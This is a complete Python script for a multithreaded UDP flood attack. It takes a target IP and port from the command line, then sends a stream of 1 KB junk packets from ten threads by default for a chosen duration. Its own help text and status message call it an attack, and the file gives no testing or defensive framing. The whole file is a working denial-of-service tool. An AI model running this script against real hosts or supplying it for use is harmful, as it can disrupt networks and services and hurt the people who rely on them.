import socket
import threading
import time

def udp_flood(target_ip, target_port, duration):
    start_time = time.time()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while time.time() - start_time < duration:
        message = b"X" * 1024  # 1KB payload
        sock.sendto(message, (target_ip, target_port))

    sock.close()

def start_attack(target_ip, target_port, threads, duration):
    for _ in range(threads):
        thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
        thread.start()

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="UDP Flood Attack")
    parser.add_argument("ip", type=str, help="Target IP address")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads to use (default: 10)")
    parser.add_argument("--duration", type=int, default=60, help="Duration of the attack in seconds (default: 60)")

    args = parser.parse_args()

    target_ip = args.ip
    target_port = args.port
    threads = args.threads
    duration = args.duration

    print(f"Starting UDP flood attack on {target_ip}:{target_port} for {duration} seconds with {threads} threads.")
    start_attack(target_ip, target_port, threads, duration)
